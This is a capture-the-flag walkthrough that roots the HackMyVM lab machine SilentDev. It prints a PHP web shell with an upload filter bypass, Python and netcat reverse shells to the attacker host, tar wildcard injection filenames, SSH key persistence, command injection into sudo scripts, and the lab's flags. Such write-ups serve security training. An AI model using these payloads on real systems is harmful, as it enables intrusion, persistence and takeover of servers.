# SilentDev - HackMyVM Walkthrough

## Machine Information

| Difficulty   | Platform |
| ------------ | -------- |
| Intermediate | HackMyVM |

Today we are solving another machine from **HackMyVM** named **SilentDev**, listed as an **Intermediate** challenge.

The objective is to gain initial access, escalate privileges through multiple users, and ultimately obtain root access.

---

# Reconnaissance

## Identifying the Target

Unlike some HackMyVM machines that require network discovery, SilentDev provides its IP address directly in the banner.

### Target IP

```bash
192.168.56.120
```

### Screenshot

![image alt](https://github.com/naval0505/HackMyVM/blob/01e89981034971bdd44ab4f85c55abdf92cfc345/Silent-Dev%20-%20HackMyVM%20Machine/upload-images/i1.png)


---

# Port Scanning

We begin with a full TCP port scan.

```bash
nmap -p- --min-rate 10000 192.168.56.120
```

### Result

```text
Nmap scan report for 192.168.56.120
Host is up, received arp-response (0.00021s latency).

Not shown: 65533 closed tcp ports (reset)

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Screenshot

![image alt](https://github.com/naval0505/HackMyVM/blob/01e89981034971bdd44ab4f85c55abdf92cfc345/Silent-Dev%20-%20HackMyVM%20Machine/upload-images/i2.png)


---

## Service Enumeration

To identify running services and versions:

```bash
nmap -sC -sV 192.168.56.120
```

### Result

```text
22/tcp open  ssh     OpenSSH 9.2p1 Debian
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
```

The web page title immediately reveals an image upload application.

### Screenshot

![image alt](https://github.com/naval0505/HackMyVM/blob/01e89981034971bdd44ab4f85c55abdf92cfc345/Silent-Dev%20-%20HackMyVM%20Machine/upload-images/i3.png)


---

# Web Enumeration

Opening the website reveals a simple image upload functionality.

### Screenshot

![image alt](https://github.com/naval0505/HackMyVM/blob/01e89981034971bdd44ab4f85c55abdf92cfc345/Silent-Dev%20-%20HackMyVM%20Machine/upload-images/i4.png)


Before testing uploads, let's enumerate directories.

```bash
gobuster dir \
-u http://192.168.56.120/ \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
```

### Result

```text
/uploads
/server-status
```

The `/uploads` directory is accessible and contains uploaded files.

### Screenshot

![image alt](https://github.com/naval0505/HackMyVM/blob/01e89981034971bdd44ab4f85c55abdf92cfc345/Silent-Dev%20-%20HackMyVM%20Machine/upload-images/i5.png)


---

# Investigating Upload Functionality

The uploads directory contained two images:

* Cat image
* Dog image

Initially, metadata analysis was performed using:

```bash
exiftool cat.jpg
exiftool dog.jpg
```

No useful information was discovered.

### Screenshot

![image alt](https://github.com/naval0505/HackMyVM/blob/01e89981034971bdd44ab4f85c55abdf92cfc345/Silent-Dev%20-%20HackMyVM%20Machine/upload-images/i6.png)


---

# File Upload Bypass

The upload functionality appeared to validate uploads using MIME type checking rather than extension validation.

A simple PHP web shell was created:

```php
<?php system($_GET['cmd']); ?>
```

Saved as:

```text
dog.php
```

Intercepting the upload request in Burp Suite and changing:

```http
Content-Type: image/jpeg
```

allowed the file to bypass validation and upload successfully.

Once uploaded, browsing to the file resulted in command execution.

### Screenshot

![image alt](https://github.com/naval0505/HackMyVM/blob/01e89981034971bdd44ab4f85c55abdf92cfc345/Silent-Dev%20-%20HackMyVM%20Machine/upload-images/i7.png)


---

# Obtaining Remote Code Execution

Testing command execution:

```text
http://192.168.56.120/uploads/dog.php?cmd=id
```

confirmed code execution.

A Python reverse shell payload was then used:

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.106",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

### Listener

```bash
nc -lvnp 4444
```

### Screenshot

![image alt](https://github.com/naval0505/HackMyVM/blob/01e89981034971bdd44ab4f85c55abdf92cfc345/Silent-Dev%20-%20HackMyVM%20Machine/upload-images/i8.png)


---

# Shell Stabilization

Once the reverse shell connected:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Background the shell:

```bash
CTRL + Z
```

On Kali:

```bash
stty raw -echo
fg
```

Then:

```bash
export TERM=xterm
```

A fully interactive shell was obtained.

### Screenshot

![image alt](https://github.com/naval0505/HackMyVM/blob/01e89981034971bdd44ab4f85c55abdf92cfc345/Silent-Dev%20-%20HackMyVM%20Machine/upload-images/i9.png)


---

# Local Enumeration

Checking SUID binaries:

```bash
find / -perm -4000 2>/dev/null
```

### Result

```text
/usr/bin/su
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/umount
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

No immediate privilege escalation vectors were discovered.

### Screenshot

![image alt](https://github.com/naval0505/HackMyVM/blob/01e89981034971bdd44ab4f85c55abdf92cfc345/Silent-Dev%20-%20HackMyVM%20Machine/upload-images/i10.png)


---

# Process Monitoring with pspy

To identify privileged processes, `pspy64` was uploaded.

Tool:

```text
https://github.com/DominicBreuker/pspy
```

After monitoring system activity, a recurring backup process was identified.

### Screenshot

![image alt](https://github.com/naval0505/HackMyVM/blob/01e89981034971bdd44ab4f85c55abdf92cfc345/Silent-Dev%20-%20HackMyVM%20Machine/upload-images/i11.png)


---

# Discovering the Vulnerable Cron Job

Observed process:

```text
UID=1002

/bin/sh -c cd /opt/project && tar -zcf /var/backups/project.tgz *
```

Additional output:

```text
tar -zcf /var/backups/project.tgz index.html
```

### Screenshot

![image alt](https://github.com/naval0505/HackMyVM/blob/01e89981034971bdd44ab4f85c55abdf92cfc345/Silent-Dev%20-%20HackMyVM%20Machine/upload-images/i12.png)


The wildcard (`*`) used by tar immediately suggests a classic **Tar Wildcard Injection** vulnerability.

---

# Exploiting Tar Wildcard Injection

Move into the writable directory:

```bash
cd /opt/project
```

Create a reverse shell script:

```bash
echo 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.56.106 4445 > /tmp/f' > shell.sh
```

Make it executable:

```bash
chmod +x shell.sh
```

Create malicious tar arguments:

```bash
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```

Set up a listener:

```bash
nc -lvnp 4445
```

Once the cron job executes, tar interprets the malicious filenames as arguments and executes our payload.

### Screenshot

![image alt](https://github.com/naval0505/HackMyVM/blob/01e89981034971bdd44ab4f85c55abdf92cfc345/Silent-Dev%20-%20HackMyVM%20Machine/upload-images/i13.png)


---

# Access as Developer

A reverse shell was received as:

```bash
developer
```

To maintain access, generate SSH keys:

```bash
ssh-keygen
```

Append the public key:

```bash
~/.ssh/authorized_keys
```

Login:

```bash
ssh developer@192.168.56.120 -i id_rsa
```

### Screenshot

![image alt](https://github.com/naval0505/HackMyVM/blob/01e89981034971bdd44ab4f85c55abdf92cfc345/Silent-Dev%20-%20HackMyVM%20Machine/upload-images/i14.png)


### Screenshot

![image alt](https://github.com/naval0505/HackMyVM/blob/01e89981034971bdd44ab4f85c55abdf92cfc345/Silent-Dev%20-%20HackMyVM%20Machine/upload-images/i15.png)


---

# Enumerating Developer

Checking sudo permissions:

```bash
sudo -l
```

### Result

```text
(developer) may run:

(alfonso) NOPASSWD: /usr/bin/sysinfo.sh
```

### Screenshot

![image alt](https://github.com/naval0505/HackMyVM/blob/01e89981034971bdd44ab4f85c55abdf92cfc345/Silent-Dev%20-%20HackMyVM%20Machine/upload-images/i16.png)


---

# Privilege Escalation to Alfonso

Execute:

```bash
sudo -u alfonso /usr/bin/sysinfo.sh
```

The script presents a menu:

```text
1. Disk usage
2. Running processes
3. Exit
```

Choosing option:

```text
1
```

Then supplying:

```bash
; /bin/bash
```

results in command injection.

### Result

```bash
alfonso@silentdev
```

---

# User Flag

Retrieve user flag:

```bash
cat user.txt
```

### Output

```text
flag{A89aHFj3830878y3hFJ3h2oH}
```

### Screenshot

![image alt](https://github.com/naval0505/HackMyVM/blob/01e89981034971bdd44ab4f85c55abdf92cfc345/Silent-Dev%20-%20HackMyVM%20Machine/upload-images/i17.png)


---

# Privilege Escalation to Root

Checking sudo permissions again:

```bash
sudo -l
```

### Result

```text
(root) NOPASSWD: /usr/bin/silentgets
```

Execute:

```bash
sudo /usr/bin/silentgets
```

The program requests a username:

```text
Enter the username:
```

Testing command injection:

```bash
; /bin/bash;
```

Results in:

```bash
root@silentdev
```

### Verification

```bash
whoami
```

```text
root
```

---

# Root Flag

Retrieve the final flag:

```bash
cat /root/root.txt
```

### Output

```text
flag{p7609TNt6a0bGF8HW78BG7eh}
```

### Screenshot

![image alt](https://github.com/naval0505/HackMyVM/blob/01e89981034971bdd44ab4f85c55abdf92cfc345/Silent-Dev%20-%20HackMyVM%20Machine/upload-images/i18.png)

---

# Attack Path Summary

```text
Upload Functionality
        │
        ▼
PHP Upload Bypass
        │
        ▼
Remote Code Execution
        │
        ▼
www-data
        │
        ▼
Tar Wildcard Injection
        │
        ▼
developer
        │
        ▼
sysinfo.sh Command Injection
        │
        ▼
alfonso
        │
        ▼
silentgets Command Injection
        │
        ▼
root
```

---

# Skills Learned

* File Upload Bypass
* MIME Type Manipulation
* PHP Web Shell Upload
* Reverse Shell Handling
* Linux Enumeration
* pspy Process Monitoring
* Tar Wildcard Injection
* SSH Persistence
* Sudo Misconfiguration Abuse
* Command Injection
* Multi-Stage Linux Privilege Escalation

---

# Flags

## User

```text
flag{A89aHFj3830878y3hFJ3h2oH}
```

## Root

```text
flag{p7609TNt6a0bGF8HW78BG7eh}
```

---

**Machine:** SilentDev
**Platform:** HackMyVM
**Difficulty:** Intermediate
**Status:** Rooted ✅
